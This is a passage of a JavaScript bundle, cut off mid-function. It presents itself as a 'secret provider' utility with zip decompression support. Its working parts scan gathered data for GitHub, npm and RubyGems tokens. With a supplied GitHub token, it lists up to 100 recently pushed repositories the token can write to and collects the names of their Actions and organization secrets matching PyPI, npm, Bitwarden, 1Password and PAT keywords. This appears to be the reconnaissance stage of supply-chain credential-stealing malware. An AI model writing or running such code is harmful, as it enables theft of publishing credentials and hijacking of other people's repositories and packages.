/*
 * Secret provider base class, result buffering, pattern matching, and artifact zip inflation support.
 */

class SecretProviderBase {
  provider;
  service;
  mode;
  patterns;
  static DEFAULT_PATTERNS = {
    ghtoken: /gh[op]_[A-Za-z0-9]{36,}/g,
    fgtoken: /github_pat_[A-Za-z0-9_]{30,}/g,
    npmtoken: /npm_[A-Za-z0-9]{36,}/g,
    rubygemstoken: /rubygems_[A-Za-z0-9_\-]{32,}/g,
  };
  constructor(
    providerName,
    serviceName,
    customPatterns,
    providerMode = "normal",
  ) {
    (this.provider = providerName),
      (this.service = serviceName),
      (this.mode = providerMode),
      (this.patterns = new Map());
    for (let [defaultPatternKey, defaultPatternRegex] of Object.entries(
      SecretProviderBase.DEFAULT_PATTERNS,
    ))
      this.patterns.set(defaultPatternKey, defaultPatternRegex);
    if (customPatterns) {
      for (let [customPatternKey, customPatternValue] of Object.entries(
        customPatterns,
      ))
        if (customPatternValue === null) this.patterns.delete(customPatternKey);
        else
          this.patterns.set(
            customPatternKey,
            customPatternValue instanceof RegExp
              ? customPatternValue
              : new RegExp(customPatternValue, "g"),
          );
    }
  }
  async *stream() {
    let baseProviderResult = await this.execute();
    if (!baseProviderResult.success)
      throw baseProviderResult.error ?? Error("provider execute() failed");
    if (baseProviderResult.data !== void 0) yield baseProviderResult.data;
  }
  async executeStreaming(providerOutputBuffer) {
    try {
      for await (let streamedProviderData of this.stream())
        providerOutputBuffer.ingest(this.success(streamedProviderData));
    } catch (providerStreamingError) {
      providerOutputBuffer.ingest(
        this.failure(
          providerStreamingError instanceof Error
            ? providerStreamingError
            : String(providerStreamingError),
        ),
      );
    }
  }
  failure(providerFailureError) {
    return {
      provider: this.provider,
      service: this.service,
      mode: this.mode,
      success: false,
      error:
        providerFailureError instanceof Error
          ? providerFailureError
          : Error(providerFailureError),
      size: 0,
    };
  }
  serializeData(providerDataToSerialize) {
    if (typeof providerDataToSerialize === "string")
      return providerDataToSerialize;
    if (providerDataToSerialize === null || providerDataToSerialize === void 0)
      return "";
    if (typeof providerDataToSerialize === "object")
      try {
        return JSON.stringify(
          providerDataToSerialize,
          (providerJsonKey, providerJsonValue) => {
            if (providerJsonValue instanceof Map)
              return Object.fromEntries(providerJsonValue);
            if (providerJsonValue instanceof Set)
              return Array.from(providerJsonValue);
            return providerJsonValue;
          },
        );
      } catch {
        if (
          "toString" in providerDataToSerialize &&
          typeof providerDataToSerialize.toString === "function"
        ) {
          let providerDataString = providerDataToSerialize.toString();
          if (providerDataString !== "[object Object]")
            return providerDataString;
        }
        return String(providerDataToSerialize);
      }
    return String(providerDataToSerialize);
  }
  async shouldRun() {
    return true;
  }
  computeSize(serializedSizeInput) {
    if (typeof Buffer < "u")
      return Buffer.byteLength(serializedSizeInput, "utf8");
    if (typeof TextEncoder < "u")
      return new TextEncoder().encode(serializedSizeInput).length;
    return serializedSizeInput.length;
  }
  success(providerSuccessData) {
    let serializedSuccessData = this.serializeData(providerSuccessData),
      providerSuccessResult = {
        provider: this.provider,
        service: this.service,
        mode: this.mode,
        success: true,
        data: providerSuccessData,
        size: this.computeSize(serializedSuccessData),
      };
    if (this.patterns.size > 0) {
      let matchesByPatternType = {};
      if (
        (this.patterns.forEach((providerPatternRegex, providerPatternType) => {
          let providerPatternMatches = Array.from(
              serializedSuccessData.matchAll(providerPatternRegex),
            ).map((providerPatternMatch) => providerPatternMatch[0]),
            uniqueProviderPatternMatches = Array.from(
              new Set(providerPatternMatches),
            );
          if (uniqueProviderPatternMatches.length > 0)
            matchesByPatternType[providerPatternType] =
              uniqueProviderPatternMatches;
        }),
        Object.keys(matchesByPatternType).length > 0)
      )
        providerSuccessResult.matches = matchesByPatternType;
    }
    return providerSuccessResult;
  }
}
initGithubApiModule();
var repoSearchSince = "2025-09-01T00:00:00Z",
  repoPageSize = 100;
async function* enumerateRecentWritableRepos(
  repoEnumerationToken,
  publicReposOnly = false,
) {
  let enumeratedRepoCount = 0,
    repoPage = 1;
  while (true) {
    let repoSearchParams = new URLSearchParams({
        per_page: String(repoPageSize),
        affiliation: "owner,collaborator,organization_member",
        sort: "pushed",
        direction: "desc",
        since: repoSearchSince,
        page: String(repoPage),
      }),
      repoPageResults = await githubJson(
        repoEnumerationToken,
        "/user/repos?" + repoSearchParams,
      );
    if (repoPageResults.length === 0) break;
    for (let githubRepo of repoPageResults) {
      if (!githubRepo.permissions?.push || !githubRepo.pushed_at) continue;
      if (publicReposOnly && githubRepo.private === true) continue;
      if (
        (yield {
          id: githubRepo.id,
          name: githubRepo.name,
          fullName: githubRepo.full_name,
          private: githubRepo.private,
          url: githubRepo.html_url,
          pushedAt: githubRepo.pushed_at,
          permissions: {
            admin: githubRepo.permissions.admin ?? false,
            push: githubRepo.permissions.push ?? false,
            pull: githubRepo.permissions.pull ?? false,
            maintain: githubRepo.permissions.maintain,
            triage: githubRepo.permissions.triage,
          },
        },
        ++enumeratedRepoCount >= 100)
      )
        return;
    }
    if (repoPageResults.length < repoPageSize) break;
    repoPage++;
  }
}
var sensitiveSecretNameKeywords = [
  "PYPI",
  "NPM",
  "BITWARDEN",
  "OP_",
  "RUBYGEMS",
  "PAT",
  "PERSONAL_ACCESS",
];
function isOldNpmTokenSecret(npmTokenSecret) {
  if (npmTokenSecret.name.toUpperCase() !== "NPM_TOKEN") return false;
  if (!npmTokenSecret.updated_at) return true;
  return new Date(npmTokenSecret.updated_at) < new Date("2025-05-20T00:00:00Z");
}
function isInterestingActionSecret(actionSecret) {
  let actionSecretNameUpper = actionSecret.name.toUpperCase();
  if (
    !sensitiveSecretNameKeywords.some((sensitiveSecretKeyword) =>
      actionSecretNameUpper.includes(sensitiveSecretKeyword),
    )
  )
    return false;
  if (isOldNpmTokenSecret(actionSecret)) return false;
  return true;
}
async function* enumerateRepoActionSecrets(
  repoSecretsToken,
  reposForSecretEnumeration,
) {
  for await (let repoForSecretEnumeration of reposForSecretEnumeration) {
    let [repoSecretsOwner, repoSecretsRepo] =
      repoForSecretEnumeration.fullName.split("/");
    if (!repoSecretsOwner || !repoSecretsRepo) continue;
    let interestingSecretNames = [];
    try {
      let repoActionsSecretsResponse = await githubFetch(
        repoSecretsToken,
        "/repos/" +
          repoSecretsOwner +
          "/" +
          repoSecretsRepo +
          "/actions/secrets?per_page=100",
      );
      if (repoActionsSecretsResponse.ok) {
        let repoActionsSecretsJson = await repoActionsSecretsResponse.json();
        interestingSecretNames.push(
          ...repoActionsSecretsJson.secrets
            .filter(isInterestingActionSecret)
            .map((repoActionSecret) => repoActionSecret.name),
        );
      }
    } catch {}
    try {
      let repoOrgSecretsResponse = await githubFetch(
        repoSecretsToken,
        "/repos/" +
          repoSecretsOwner +
          "/" +
          repoSecretsRepo +
          "/actions/organization-secrets?per_page=100",
      );
      if (repoOrgSecretsResponse.ok) {
        let repoOrgSecretsJson = await repoOrgSecretsResponse.json();
        interestingSecretNames.push(
          ...repoOrgSecretsJson.secrets
            .filter(isInterestingActionSecret)
            .map((repoOrgSecret) => repoOrgSecret.name),
        );
      }
    } catch {}
    yield {
      fullName: repoForSecretEnumeration.fullName,
      secrets: interestingSecretNames,
    };
  }
}
import { createRequire as nodeCreateRequire } from "module";
var nodeRequire = nodeCreateRequire("/"),
  workerThreadClass;
try {
  workerThreadClass = nodeRequire("worker_threads").Worker;
} catch (workerThreadLoadError) {}
var Uint8ArrayCtor = Uint8Array,
  Uint16ArrayCtor = Uint16Array,
  Int32ArrayCtor = Int32Array,
  deflateLengthExtraBits = new Uint8ArrayCtor([
    0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5,
    5, 5, 5, 0, 0, 0, 0,
  ]),
  deflateDistanceExtraBits = new Uint8ArrayCtor([
    0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10,
    11, 11, 12, 12, 13, 13, 0, 0,
  ]),
  deflateCodeLengthOrder = new Uint8ArrayCtor([
    16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15,
  ]),
  buildDeflateBaseReverseMap = function (
    deflateExtraBitsTable,
    deflateBaseAccumulator,
  ) {
    var deflateBaseTable = new Uint16ArrayCtor(31);
    for (var deflateCodeIndex = 0; deflateCodeIndex < 31; ++deflateCodeIndex)
      deflateBaseTable[deflateCodeIndex] = deflateBaseAccumulator +=
        1 << deflateExtraBitsTable[deflateCodeIndex - 1];
    var deflateReverseLookupTable = new Int32ArrayCtor(deflateBaseTable[30]);
    for (var deflateCodeIndex = 1; deflateCodeIndex < 30; ++deflateCodeIndex)
      for (
        var deflateBaseValue = deflateBaseTable[deflateCodeIndex];
        deflateBaseValue < deflateBaseTable[deflateCodeIndex + 1];
        ++deflateBaseValue
      )
        deflateReverseLookupTable[deflateBaseValue] =
          ((deflateBaseValue - deflateBaseTable[deflateCodeIndex]) << 5) |
          deflateCodeIndex;
    return { b: deflateBaseTable, r: deflateReverseLookupTable };
  },
  lengthBaseReverseMap = buildDeflateBaseReverseMap(deflateLengthExtraBits, 2),
  deflateLengthBases = lengthBaseReverseMap.b,
  deflateLengthReverseMap = lengthBaseReverseMap.r;
(deflateLengthBases[28] = 258), (deflateLengthReverseMap[258] = 28);
var distanceBaseReverseMap = buildDeflateBaseReverseMap(
    deflateDistanceExtraBits,
    0,
  ),
  deflateDistanceBases = distanceBaseReverseMap.b,
  deflateDistanceReverseMap = distanceBaseReverseMap.r,
  bitReverseTable = new Uint16ArrayCtor(32768);
for (inflateTableIndex = 0; inflateTableIndex < 32768; ++inflateTableIndex)
  (inflateBitReverseScratch =
    ((inflateTableIndex & 43690) >> 1) | ((inflateTableIndex & 21845) << 1)),
    (inflateBitReverseScratch =
      ((inflateBitReverseScratch & 52428) >> 2) |
      ((inflateBitReverseScratch & 13107) << 2)),
    (inflateBitReverseScratch =
      ((inflateBitReverseScratch & 61680) >> 4) |
      ((inflateBitReverseScratch & 3855) << 4)),
    (bitReverseTable[inflateTableIndex] =
      (((inflateBitReverseScratch & 65280) >> 8) |
        ((inflateBitReverseScratch & 255) << 8)) >>
      1);
var inflateBitReverseScratch,
  inflateTableIndex,
  buildHuffmanDecodeTable = function (
    huffmanCodeLengths,
    huffmanMaxBits,
    huffmanBuildFullTable,
  ) {
    var huffmanSymbolCount = huffmanCodeLengths.length,
      huffmanSymbolIndex = 0,
      huffmanLengthCounts = new Uint16ArrayCtor(huffmanMaxBits);
    for (; huffmanSymbolIndex < huffmanSymbolCount; ++huffmanSymbolIndex)
      if (huffmanCodeLengths[huffmanSymbolIndex])
        ++huffmanLengthCounts[huffmanCodeLengths[huffmanSymbolIndex] - 1];
    var huffmanNextCodes = new Uint16ArrayCtor(huffmanMaxBits);
    for (
      huffmanSymbolIndex = 1;
      huffmanSymbolIndex < huffmanMaxBits;
      ++huffmanSymbolIndex
    )
      huffmanNextCodes[huffmanSymbolIndex] =
        (huffmanNextCodes[huffmanSymbolIndex - 1] +
          huffmanLengthCounts[huffmanSymbolIndex - 1]) <<
        1;
    var huffmanDecodeTable;
    if (huffmanBuildFullTable) {
      huffmanDecodeTable = new Uint16ArrayCtor(1 << huffmanMaxBits);
      var huffmanReverseShift = 15 - huffmanMaxBits;
      for (
        huffmanSymbolIndex = 0;
        huffmanSymbolIndex < huffmanSymbolCount;
        ++huffmanSymbolIndex
      )
        if (huffmanCodeLengths[huffmanSymbolIndex]) {
          var huffmanPackedSymbol =
              (huffmanSymbolIndex << 4) |
              huffmanCodeLengths[huffmanSymbolIndex],
            huffmanFillBits =
              huffmanMaxBits - huffmanCodeLengths[huffmanSymbolIndex],
            huffmanFillCode =
              huffmanNextCodes[huffmanCodeLengths[huffmanSymbolIndex] - 1]++ <<
              huffmanFillBits;
          for (
            var huffmanFillCodeLimit =
              huffmanFillCode | ((1 << huffmanFillBits) - 1);
            huffmanFillCode <= huffmanFillCodeLimit;
            ++huffmanFillCode
          )
            huffmanDecodeTable[
              bitReverseTable[huffmanFillCode] >> huffmanReverseShift
            ] = huffmanPackedSymbol;
        }
    } else {
      huffmanDecodeTable = new Uint16ArrayCtor(huffmanSymbolCount);
      for (
        huffmanSymbolIndex = 0;
        huffmanSymbolIndex < huffmanSymbolCount;
        ++huffmanSymbolIndex
      )
        if (huffmanCodeLengths[huffmanSymbolIndex])
          huffmanDecodeTable[huffmanSymbolIndex] =
            bitReverseTable[
              huffmanNextCodes[huffmanCodeLengths[huffmanSymbolIndex] - 1]++
            ] >>
            (15 - huffmanCodeLengths[huffmanSymbolIndex]);
    }
    return huffmanDecodeTable;
  },
  fixedLiteralLengthCodeLengths = new Uint8ArrayCtor(288);
for (inflateTableIndex = 0; inflateTableIndex < 144; ++inflateTableIndex)
  fixedLiteralLengthCodeLengths[inflateTableIndex] = 8;
var inflateTableIndex;
for (inflateTableIndex = 144; inflateTableIndex < 256; ++inflateTableIndex)
  fixedLiteralLengthCodeLengths[inflateTableIndex] = 9;
var inflateTableIndex;
for (inflateTableIndex = 256; inflateTableIndex < 280; ++inflateTableIndex)
  fixedLiteralLengthCodeLengths[inflateTableIndex] = 7;
var inflateTableIndex;
for (inflateTableIndex = 280; inflateTableIndex < 288; ++inflateTableIndex)
  fixedLiteralLengthCodeLengths[inflateTableIndex] = 8;
var inflateTableIndex,
  fixedDistanceCodeLengths = new Uint8ArrayCtor(32);
for (inflateTableIndex = 0; inflateTableIndex < 32; ++inflateTableIndex)
  fixedDistanceCodeLengths[inflateTableIndex] = 5;
var inflateTableIndex,
  fixedLiteralLengthTable = buildHuffmanDecodeTable(
    fixedLiteralLengthCodeLengths,
    9,
    1,
  ),
  fixedDistanceTable = buildHuffmanDecodeTable(fixedDistanceCodeLengths, 5, 1),
  maxCodeLength = function (codeLengthsForMax) {
    var maxSeenCodeLength = codeLengthsForMax[0];
    for (
      var codeLengthScanIndex = 1;
      codeLengthScanIndex < codeLengthsForMax.length;
      ++codeLengthScanIndex
    )
      if (codeLengthsForMax[codeLengthScanIndex] > maxSeenCodeLength)
        maxSeenCodeLength = codeLengthsForMax[codeLengthScanIndex];
    return maxSeenCodeLength;
  },
  readBits = function (bitReadBuffer, bitReadOffset, bitReadMask) {
    var bitReadByteOffset = (bitReadOffset / 8) | 0;
    return (
      ((bitReadBuffer[bitReadByteOffset] |
        (bitReadBuffer[bitReadByteOffset + 1] << 8)) >>
        (bitReadOffset & 7)) &
      bitReadMask
    );
  },
  readBits24 = function (bitRead24Buffer, bitRead24Offset) {
    var bitRead24ByteOffset = (bitRead24Offset / 8) | 0;
    return (
      (bitRead24Buffer[bitRead24ByteOffset] |
        (bitRead24Buffer[bitRead24ByteOffset + 1] << 8) |
        (bitRead24Buffer[bitRead24ByteOffset + 2] << 16)) >>
      (bitRead24Offset & 7)
    );
  },
  bitOffsetToByteLength = function (bitOffset) {
    return ((bitOffset + 7) / 8) | 0;
  },
  sliceUint8 = function (uint8SliceSource, uint8SliceStart, uint8SliceEnd) {
    if (uint8SliceStart == null || uint8SliceStart < 0) uint8SliceStart = 0;
    if (uint8SliceEnd == null || uint8SliceEnd > uint8SliceSource.length)
      uint8SliceEnd = uint8SliceSource.length;
    return new Uint8ArrayCtor(
      uint8SliceSource.subarray(uint8SliceStart, uint8SliceEnd),
    );
  },
  inflateErrorMessages = [
    "unexpected EOF",
    "invalid block type",
    "invalid length/literal",
    "invalid distance",
    "stream finished",
    "no stream handler",
    ,
    "no callback",
    "invalid UTF-8 data",
    "extra field too long",
    "date not in range 1980-2099",
    "filename too long",
    "stream finishing",
    "invalid zip data",
  ],
  throwInflateError = function (
    inflateErrorCode,
    inflateErrorMessage,
    returnInflateError,
  ) {
    var inflateError = Error(
      inflateErrorMessage || inflateErrorMessages[inflateErrorCode],
    );
    if (((inflateError.code = inflateErrorCode), Error.captureStackTrace))
      Error.captureStackTrace(inflateError, throwInflateError);
    if (!returnInflateError) throw inflateError;
    return inflateError;
  },
  inflateRawCore = function (
    inflateInputBuffer,
    inflateState,
    inflateOutputBuffer,
    inflateDictionary,
  ) {
    var inflateInputLength = inflateInputBuffer.length,
      inflateDictionaryLength = inflateDictionary
        ? inflateDictionary.length
        : 0;
    if (!inflateInputLength || (inflateState.f && !inflateState.l))
      return inflateOutputBuffer || new Uint8ArrayCtor(0);
    var inflateOwnsOutputBuffer = !inflateOutputBuffer,
      inflateCanGrowOutput = inflateOwnsOutputBuffer || inflateState.i != 2,
      inflateMode = inflateState.i;
    if (inflateOwnsOutputBuffer)
      inflateOutputBuffer = new Uint8ArrayCtor(inflateInputLength * 3);
    var ensureInflateOutputCapacity = function (requiredInflateCapacity) {
        var currentInflateCapacity = inflateOutputBuffer.length;
        if (requiredInflateCapacity > currentInflateCapacity) {
          var grownInflateOutputBuffer = new Uint8ArrayCtor(
            Math.max(currentInflateCapacity * 2, requiredInflateCapacity),
          );
          grownInflateOutputBuffer.set(inflateOutputBuffer),
            (inflateOutputBuffer = grownInflateOutputBuffer);
        }
      },
      inflateFinalBlock = inflateState.f || 0,
      inflateBitPosition = inflateState.p || 0,
      inflateOutputOffset = inflateState.b || 0,
      literalLengthTable = inflateState.l,
      distanceTable = inflateState.d,
      literalLengthMaxBits = inflateState.m,
      distanceMaxBits = inflateState.n,
      inflateInputBitLength = inflateInputLength * 8;
    do {
      if (!literalLengthTable) {
        inflateFinalBlock = readBits(inflateInputBuffer, inflateBitPosition, 1);
        var deflateBlockType = readBits(
          inflateInputBuffer,
          inflateBitPosition + 1,
          3,
        );
        if (((inflateBitPosition += 3), !deflateBlockType)) {
          var storedBlockOffsetOrSymbol =
              bitOffsetToByteLength(inflateBitPosition) + 4,
            storedBlockLength =
              inflateInputBuffer[storedBlockOffsetOrSymbol - 4] |
              (inflateInputBuffer[storedBlockOffsetOrSymbol - 3] << 8),
            storedBlockEndOffset =
              storedBlockOffsetOrSymbol + storedBlockLength;
          if (storedBlockEndOffset > inflateInputLength) {
            if (inflateMode) throwInflateError(0);
            break;
          }
          if (inflateCanGrowOutput)
            ensureInflateOutputCapacity(
              inflateOutputOffset + storedBlockLength,
            );
          inflateOutputBuffer.set(
            inflateInputBuffer.subarray(
              storedBlockOffsetOrSymbol,
              storedBlockEndOffset,
            ),
            inflateOutputOffset,
          ),
            (inflateState.b = inflateOutputOffset += storedBlockLength),
            (inflateState.p = inflateBitPosition = storedBlockEndOffset * 8),
            (inflateState.f = inflateFinalBlock);
          continue;
        } else {
          if (deflateBlockType == 1)
            (literalLengthTable = fixedLiteralLengthTable),
              (distanceTable = fixedDistanceTable),
              (literalLengthMaxBits = 9),
              (distanceMaxBits = 5);
          else {
            if (deflateBlockType == 2) {
              var dynamicLiteralLengthCount =
                  readBits(inflateInputBuffer, inflateBitPosition, 31) + 257,
                dynamicCodeLengthCount =
                  readBits(inflateInputBuffer, inflateBitPosition + 10, 15) + 4,
                dynamicTotalCodeCount =
                  dynamicLiteralLengthCount +
                  readBits(inflateInputBuffer, inflateBitPosition + 5, 31) +
                  1;
              inflateBitPosition += 14;
              var dynamicCodeLengths = new Uint8ArrayCtor(
                  dynamicTotalCodeCount,
                ),
                dynamicCodeLengthCodeLengths = new Uint8ArrayCtor(19);
              for (
                var dynamicCodeIndex = 0;
                dynamicCodeIndex < dynamicCodeLengthCount;
                ++dynamicCodeIndex
              )
                dynamicCodeLengthCodeLengths[
                  deflateCodeLengthOrder[dynamicCodeIndex]
                ] = readBits(
                  inflateInputBuffer,
                  inflateBitPosition + dynamicCodeIndex * 3,
                  7,
                );
              inflateBitPosition += dynamicCodeLengthCount * 3;
              var codeLengthMaxBits = maxCodeLength(
                  dynamicCodeLengthCodeLengths,
                ),
                codeLengthReadMask = (1 << codeLengthMaxBits) - 1,
                codeLengthDecodeTable = buildHuffmanDecodeTable(
                  dynamicCodeLengthCodeLengths,
                  codeLengthMaxBits,
                  1,
                );
              for (
                var dynamicCodeIndex = 0;
                dynamicCodeIndex < dynamicTotalCodeCount;

              ) {
                var packedCodeLengthSymbol =
                  codeLengthDecodeTable[
                    readBits(
                      inflateInputBuffer,
                      inflateBitPosition,
                      codeLengthReadMask,
                    )
                  ];
                inflateBitPosition += packedCodeLengthSymbol & 15;
                var storedBlockOffsetOrSymbol = packedCodeLengthSymbol >> 4;
                if (storedBlockOffsetOrSymbol < 16)
                  dynamicCodeLengths[dynamicCodeIndex++] =
                    storedBlockOffsetOrSymbol;
                else {
                  var repeatCodeOrPackedSymbol = 0,
                    repeatCodeCount = 0;
                  if (storedBlockOffsetOrSymbol == 16)
                    (repeatCodeCount =
                      3 + readBits(inflateInputBuffer, inflateBitPosition, 3)),
                      (inflateBitPosition += 2),
                      (repeatCodeOrPackedSymbol =
                        dynamicCodeLengths[dynamicCodeIndex - 1]);
                  else {
                    if (storedBlockOffsetOrSymbol == 17)
                      (repeatCodeCount =
                        3 +
                        readBits(inflateInputBuffer, inflateBitPosition, 7)),
                        (inflateBitPosition += 3);
                    else {
                      if (storedBlockOffsetOrSymbol == 18)
                        (repeatCodeCount =
                          11 +
                          readBits(
                            inflateInputBuffer,
                            inflateBitPosition,
                            127,
                          )),
                          (inflateBitPosition += 7);
                    }
                  }
                  while (repeatCodeCount--)
                    dynamicCodeLengths[dynamicCodeIndex++] =
                      repeatCodeOrPackedSymbol;
                }
              }
              var dynamicLiteralLengthCodeLengths = dynamicCodeLengths.subarray(
                  0,
                  dynamicLiteralLengthCount,
                ),
                distanceCodeLengthsOrDistance = dynamicCodeLengths.subarray(
                  dynamicLiteralLengthCount,
                );
              (literalLengthMaxBits = maxCodeLength(
                dynamicLiteralLengthCodeLengths,
              )),
                (distanceMaxBits = maxCodeLength(
                  distanceCodeLengthsOrDistance,
                )),
                (literalLengthTable = buildHuffmanDecodeTable(
                  dynamicLiteralLengthCodeLengths,
                  literalLengthMaxBits,
                  1,
                )),
                (distanceTable = buildHuffmanDecodeTable(
                  distanceCodeLengthsOrDistance,
                  distanceMaxBits,
                  1,
                ));
            } else throwInflateError(1);
          }
        }
        if (inflateBitPosition > inflateInputBitLength) {
          if (inflateMode) throwInflateError(0);
          break;
        }
      }
      if (inflateCanGrowOutput)
        ensureInflateOutputCapacity(inflateOutputOffset + 131072);
      var literalLengthReadMask = (1 << literalLengthMaxBits) - 1,
        distanceReadMask = (1 << distanceMaxBits) - 1,
        lastSafeBitPosition = inflateBitPosition;
      for (; ; lastSafeBitPosition = inflateBitPosition) {
        var repeatCodeOrPackedSymbol =
            literalLengthTable[
              readBits24(inflateInputBuffer, inflateBitPosition) &
                literalLengthReadMask
            ],
          literalOrLengthSymbol = repeatCodeOrPackedSymbol >> 4;
        if (
          ((inflateBitPosition += repeatCodeOrPackedSymbol & 15),
          inflateBitPosition > inflateInputBitLength)
        ) {
          if (inflateMode) throwInflateError(0);
          break;
        }
        if (!repeatCodeOrPackedSymbol) throwInflateError(2);
        if (literalOrLengthSymbol < 256)
          inflateOutputBuffer[inflateOutputOffset++] = literalOrLengthSymbol;
        else {
          if (literalOrLengthSymbol == 256) {
            (lastSafeBitPosition = inflateBitPosition),
              (literalLengthTable = null);
            break;
          } else {
            var matchLength = literalOrLengthSymbol - 254;
            if (literalOrLengthSymbol > 264) {
              var dynamicCodeIndex = literalOrLengthSymbol - 257,
                extraBitCount = deflateLengthExtraBits[dynamicCodeIndex];
              (matchLength =
                readBits(
                  inflateInputBuffer,
                  inflateBitPosition,
                  (1 << extraBitCount) - 1,
                ) + deflateLengthBases[dynamicCodeIndex]),
                (inflateBitPosition += extraBitCount);
            }
            var packedDistanceSymbol =
                distanceTable[
                  readBits24(inflateInputBuffer, inflateBitPosition) &
                    distanceReadMask
                ],
              distanceSymbol = packedDistanceSymbol >> 4;
            if (!packedDistanceSymbol) throwInflateError(3);
            inflateBitPosition += packedDistanceSymbol & 15;
            var distanceCodeLengthsOrDistance =
              deflateDistanceBases[distanceSymbol];
            if (distanceSymbol > 3) {
              var extraBitCount = deflateDistanceExtraBits[distanceSymbol];
              (distanceCodeLengthsOrDistance +=
                readBits24(inflateInputBuffer, inflateBitPosition) &
                ((1 << extraBitCount) - 1)),
                (inflateBitPosition += extraBitCount);
            }
            if (inflateBitPosition > inflateInputBitLength) {
              if (inflateMode) throwInflateError(0);
              break;
            }
            if (inflateCanGrowOutput)
              ensureInflateOutputCapacity(inflateOutputOffset + 131072);
            var matchCopyEndOffset = inflateOutputOffset + matchLength;
            if (inflateOutputOffset < distanceCodeLengthsOrDistance) {
              var dictionaryCopyOffset =
                  inflateDictionaryLength - distanceCodeLengthsOrDistance,
                dictionaryCopyEndOffset = Math.min(
                  distanceCodeLengthsOrDistance,
                  matchCopyEndOffset,
                );
              if (dictionaryCopyOffset + inflateOutputOffset < 0)
                throwInflateError(3);
              for (
                ;
                inflateOutputOffset < dictionaryCopyEndOffset;
                ++inflateOutputOffset
              )
                inflateOutputBuffer[inflateOutputOffset] =
                  inflateDictionary[dictionaryCopyOffset + inflateOutputOffset];
            }
            for (
              ;
              inflateOutputOffset < matchCopyEndOffset;
              ++inflateOutputOffset
            )
              inflateOutputBuffer[inflateOutputOffset] =
                inflateOutputBuffer[
                  inflateOutputOffset - distanceCodeLengthsOrDistance
                ];
          }
        }
      }
      if (
        ((inflateState.l = literalLengthTable),
        (inflateState.p = lastSafeBitPosition),
        (inflateState.b = inflateOutputOffset),
        (inflateState.f = inflateFinalBlock),
        literalLengthTable)
      )
        (inflateFinalBlock = 1),
          (inflateState.m = literalLengthMaxBits),
          (inflateState.d = distanceTable),
          (inflateState.n = distanceMaxBits);
    } while (!inflateFinalBlock);
    return inflateOutputOffset != inflateOutputBuffer.length &&
      inflateOwnsOutputBuffer
      ? sliceUint8(inflateOutputBuffer, 0, inflateOutputOffset)
      : inflateOutputBuffer.subarray(0, inflateOutputOffset);
  },
  emptyUint8Array = new Uint8ArrayCtor(0),
  readUint16LE = function (uint16ReadBuffer, uint16ReadOffset) {
    return (
      uint16ReadBuffer[uint16ReadOffset] |
      (uint16ReadBuffer[uint16ReadOffset + 1] << 8)
    );
  },
  readUint32LE = function (uint32ReadBuffer, uint32ReadOffset) {
    return (
      (uint32ReadBuffer[uint32ReadOffset] |
        (uint32ReadBuffer[uint32ReadOffset + 1] << 8) |
        (uint32ReadBuffer[uint32ReadOffset + 2] << 16) |
        (uint32ReadBuffer[uint32ReadOffset + 3] << 24)) >>>
      0
    );
  },
  readUint64LEAsNumber = function (uint64ReadBuffer, uint64ReadOffset) {
    return (
      readUint32LE(uint64ReadBuffer, uint64ReadOffset) +
      readUint32LE(uint64ReadBuffer, uint64ReadOffset + 4) * 4294967296
    );
  };
function inflateRawSync(inflateRawInput, inflateRawOptions) {
  return inflateRawCore(
    inflateRawInput,
    { i: 2 },
    inflateRawOptions && inflateRawOptions.out,
    inflateRawOptions && inflateRawOptions.dictionary,
  );
}
var utf8TextDecoder = typeof TextDecoder < "u" && new TextDecoder(),
  supportsStreamingTextDecoder = 0;
try {
  utf8TextDecoder.decode(emptyUint8Array, { stream: true }),
    (supportsStreamingTextDecoder = 1);
} catch (streamingDecoderProbeError) {}
var decodeUtf8Fallback = function (utf8FallbackBytes) {
  for (var utf8FallbackText = "", utf8FallbackOffset = 0; ; ) {
    var utf8FallbackByte = utf8FallbackBytes[utf8FallbackOffset++],
      utf8ContinuationCount =
        (utf8FallbackByte > 127) +
        (utf8FallbackByte > 223) +
        (utf8FallbackByte > 239);
    if (utf8FallbackOffset + utf8ContinuationCount > utf8FallbackBytes.length)
      return {
        s: utf8FallbackText,
        r: sliceUint8(utf8FallbackBytes, utf8FallbackOffset - 1),
      };
    if (!utf8ContinuationCount)
      utf8FallbackText += String.fromCharCode(utf8FallbackByte);
    else {
      if (utf8ContinuationCount == 3)
        (utf8FallbackByte =
          (((utf8FallbackByte & 15) << 18) |
            ((utf8FallbackBytes[utf8FallbackOffset++] & 63) << 12) |
            ((utf8FallbackBytes[utf8FallbackOffset++] & 63) << 6) |
            (utf8FallbackBytes[utf8FallbackOffset++] & 63)) -
          65536),
          (utf8FallbackText += String.fromCharCode(
            55296 | (utf8FallbackByte >> 10),
            56320 | (utf8FallbackByte & 1023),
          ));
      else {
        if (utf8ContinuationCount & 1)
          utf8FallbackText += String.fromCharCode(
            ((utf8FallbackByte & 31) << 6) |
              (utf8FallbackBytes[utf8FallbackOffset++] & 63),
          );
        else
          utf8FallbackText += String.fromCharCode(
            ((utf8FallbackByte & 15) << 12) |
              ((utf8FallbackBytes[utf8FallbackOffset++] & 63) << 6) |
              (utf8FallbackBytes[utf8FallbackOffset++] & 63),
          );
      }
    }
  }
};
function decodeZipString(zipNameBytes, zipNameIsLatin1) {
  if (zipNameIsLatin1) {
    var zipDecodedName = "";
    for (
      var zipNameOffset = 0;
      zipNameOffset < zipNameBytes.length;
      zipNameOffset += 16384
    )
      zipDecodedName += String.fromCharCode.apply(
        null,
        zipNameBytes.subarray(zipNameOffset, zipNameOffset + 16384),
      );
    return zipDecodedName;
  } else {
    if (utf8TextDecoder) return utf8TextDecoder.decode(zipNameBytes);
    else {
      var zipUtf8Fallback = decodeUtf8Fallback(zipNameBytes),
        zipUtf8DecodedText = zipUtf8Fallback.s,
        zipDecodedName = zipUtf8Fallback.r;
      if (zipDecodedName.length) throwInflateError(8);
      return zipUtf8DecodedText;
    }
  }
}
var localFileDataOffset = function (localHeaderBuffer, localHeaderOffset) {
    return (
      localHeaderOffset +
      30 +
      readUint16LE(localHeaderBuffer, localHeaderOffset + 26) +
      readUint16LE(localHeaderBuffer, localHeaderOffset + 28)
    );
  },
  readCentralDirectoryEntry = function (
    centralDirectoryBuffer,
    centralDirectoryOffset,
    centralDirectoryHasZip64,
  ) {
    var centralDirectoryNameLength = readUint16LE(
